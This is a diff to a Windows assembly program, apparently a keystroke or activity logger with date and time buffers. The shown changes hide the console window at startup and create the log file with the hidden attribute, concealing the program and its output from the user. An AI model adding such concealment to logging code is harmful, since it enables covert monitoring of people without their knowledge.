@@ -25,6 +25,7 @@ WinMain proto :DWORD, :DWORD, :DWORD, :DWORD
 	fechaBuf db 50 dup(?)
 	horaBuf db 50 dup(?)
 	manejo dd ?
+	consola dd ?
 	key dd ?
 	bytesw dd ?
 ;code segment
@@ -33,11 +34,15 @@ program:
 	call main
 
 	main proc
-		local systime:SYSTEMTIME
+		;invoke FreeConsole
+		invoke GetConsoleWindow
+		mov consola, eax
+
+		invoke ShowWindow,consola,0
 
 		mov edx, offset directorio
 		
-		INVOKE CreateFile, edx, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL,NULL	
+		INVOKE CreateFile, edx, GENERIC_WRITE OR GENERIC_READ, FILE_SHARE_READ OR FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_HIDDEN,NULL	
 		INVOKE SetFilePointer, eax, 0, 0, FILE_END
 
 		mov manejo, eax
@@ -90,6 +95,7 @@ program:
 
 		fin_programa:
 		invoke ExitProcess,0
+		ret
 	main endp
 
 	LeerArchivo PROC
